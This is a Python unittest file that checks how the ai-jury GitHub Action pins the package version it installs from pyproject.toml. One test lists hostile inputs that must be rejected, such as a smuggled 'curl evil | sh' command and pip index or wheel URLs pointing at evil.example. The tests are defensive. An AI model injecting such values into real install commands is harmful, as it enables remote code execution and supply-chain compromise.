"""A ref of the GitHub Action pins the ai-jury it installs (#867).

`version:` defaulted to the empty string and empty meant `pip install ai-jury`, the
newest release: `uses: berkayturanci/ai-jury@v1.19.1` pinned the YAML and not the
package that ran. The default is now the version the Action's own tree declares,
worked out by `scripts/action_install_spec.py`. Driven through Python rather than
through the shell step, because this suite runs on the Windows matrix leg too.
"""

from __future__ import annotations

import contextlib
import importlib.util
import io
import os
import subprocess
import sys
import tempfile
import tomllib
import unittest
from pathlib import Path

from ai_jury import __version__

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPT = REPO_ROOT / "scripts" / "action_install_spec.py"


class _Loaded(unittest.TestCase):
    def setUp(self):
        self.assertTrue(
            SCRIPT.is_file(),
            "scripts/action_install_spec.py is missing: nothing pins the package the "
            "Action installs to the Action's own ref",
        )
        spec = importlib.util.spec_from_file_location("action_install_spec", SCRIPT)
        self.mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(self.mod)
        self.pyproject = (REPO_ROOT / "pyproject.toml").read_text(encoding="utf-8")


class TheDefaultIsTheActionsOwnRelease(_Loaded):
    def test_an_unset_version_pins_what_this_tree_declares(self):
        declared = tomllib.loads(self.pyproject)["project"]["version"]
        self.assertEqual(self.mod.requirement("", self.pyproject), f"ai-jury=={declared}")
        # …which is the package this tree is: the release flow keeps them equal.
        self.assertEqual(declared, __version__)

    def test_a_blank_value_is_the_default_too(self):
        """An unset repository variable passed through `version:` arrives as ""."""
        self.assertEqual(self.mod.requirement("  ", self.pyproject), f"ai-jury=={__version__}")

    def test_the_script_run_as_the_action_runs_it_prints_the_pin(self):
        env = {k: v for k, v in os.environ.items() if k != "INPUT_VERSION"}
        env.update(GITHUB_ACTION_PATH=str(REPO_ROOT), INPUT_VERSION="")
        done = subprocess.run(
            [sys.executable, str(SCRIPT)],
            env=env,
            capture_output=True,
            text=True,
            check=False,
        )
        self.assertEqual((done.returncode, done.stdout.strip()), (0, f"ai-jury=={__version__}"))

    def test_no_readable_pyproject_fails_rather_than_installing_the_newest(self):
        """Falling back to `pip install ai-jury` is the bug; say so and stop."""
        with self.assertRaises(self.mod.SpecError):
            self.mod.requirement("", None)
        for broken in ("[project]\nname = 'x'\n", "not toml [", "[project]\nversion = 3\n"):
            with self.subTest(pyproject=broken), self.assertRaises(self.mod.SpecError):
                self.mod.requirement("", broken)
        with tempfile.TemporaryDirectory() as empty:
            err = io.StringIO()
            with contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
                code = self.mod.main({"GITHUB_ACTION_PATH": empty, "INPUT_VERSION": ""})
        self.assertEqual(code, 2)
        self.assertIn("version:", err.getvalue())
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(self.mod.main({}), 2)


class AnExplicitVersionStillWins(_Loaded):
    def test_a_release_number_is_installed_as_written(self):
        for value, spec in (
            ("1.19.1", "ai-jury==1.19.1"),
            (" 1.19.1 ", "ai-jury==1.19.1"),
            ("v1.19.1", "ai-jury==v1.19.1"),
            ("2.0.0rc1", "ai-jury==2.0.0rc1"),
            ("1.20.1.post1", "ai-jury==1.20.1.post1"),
        ):
            with self.subTest(value=value):
                self.assertEqual(self.mod.requirement(value, self.pyproject), spec)

    def test_latest_restores_the_unpinned_install_by_name(self):
        self.assertEqual(self.mod.requirement("latest", self.pyproject), "ai-jury")

    def test_main_prints_the_explicit_pin(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = self.mod.main({"INPUT_VERSION": "1.19.1", "GITHUB_ACTION_PATH": ""})
        self.assertEqual((code, out.getvalue().strip()), (0, "ai-jury==1.19.1"))

    def test_a_value_that_is_not_a_version_is_refused(self):
        """Caller-supplied, and it becomes part of a pip argument."""
        for value in (
            '1.0"; curl evil | sh; "',
            "1.0 --index-url https://evil.example/simple",
            ">=1.0",
            "1.0; python_version>'3'",
            "ai-jury @ https://evil.example/x.whl",
            "1.0\n--pre",
            "*",
            "v",
            "1.0.",
        ):
            with self.subTest(value=value), self.assertRaises(self.mod.SpecError):
                self.mod.requirement(value, self.pyproject)


class TheActionUsesIt(unittest.TestCase):
    def setUp(self):
        self.text = (REPO_ROOT / "action.yml").read_text(encoding="utf-8")
        self.install = self.text.split("- name: Install ai-jury", 1)[1].split("- name:", 1)[0]

    def test_the_install_step_asks_the_script_and_installs_its_answer(self):
        self.assertIn('python "$GITHUB_ACTION_PATH/scripts/action_install_spec.py"', self.install)
        self.assertIn('python -m pip install "$SPEC"', self.install)
        self.assertIn("INPUT_VERSION: ${{ inputs.version }}", self.install)

    def test_no_unpinned_install_is_left_in_the_step(self):
        self.assertNotIn("pip install ai-jury\n", self.install)

    def test_the_input_documents_the_new_default(self):
        block = self.text.split("\n  version:", 1)[1].split("\nruns:", 1)[0]
        self.assertNotIn("defaults to latest", block)
        self.assertIn("pyproject.toml", block)


class TheReleaseFlowKeepsThePinExact(unittest.TestCase):
    """The default is exact only because of two properties of publish.yml."""

    def setUp(self):
        self.text = (REPO_ROOT / ".github" / "workflows" / "publish.yml").read_text(
            encoding="utf-8"
        )

    def test_a_tag_that_disagrees_with_pyproject_is_not_published(self):
        self.assertIn("Verify tag matches pyproject", self.text)
        self.assertIn("must match", self.text)

    def test_the_major_alias_moves_only_after_the_release_is_verified(self):
        job = self.text.split("\n  major-tag:", 1)[1]
        self.assertIn("needs: [build-n-publish, verify]", job.split("steps:", 1)[0])


if __name__ == "__main__":
    unittest.main()
